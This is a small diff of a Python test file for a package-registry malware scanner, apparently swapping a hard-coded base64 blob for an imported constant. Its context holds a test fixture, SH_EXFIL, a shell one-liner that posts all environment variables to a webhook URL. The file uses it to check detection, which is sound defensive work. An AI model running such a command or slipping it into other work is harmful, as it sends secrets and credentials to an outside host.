@@ -21,7 +21,7 @@ from unittest import mock
 
 from lazaret.registry import repo
 from tests.registry._review_support import (
-    DECODE_EXEC_JS, DECODE_EXEC_PY, ELF, EXFIL_JS, hooks, issues, manifest, scan_npm,
+    B64_DATA, DECODE_EXEC_JS, DECODE_EXEC_PY, ELF, EXFIL_JS, hooks, issues, manifest, scan_npm,
     scan_sdist, scan_wheel)
 
 SH_EXFIL = "env | curl -s -X POST --data-binary @- https://webhook.site/0000-example\n"
@@ -167,7 +167,7 @@ class ShellRiskPrecisionTests(unittest.TestCase):
 
 
 class TestPathTests(unittest.TestCase):
-    BLOB = "const p = '" + "QUJD" * 150 + "';\n"
+    BLOB = "const p = '" + B64_DATA + "';\n"
 
     def package(self, d):
         return {"package.json": json.dumps({"name": "x", "main": f"{d}/index.js"}),
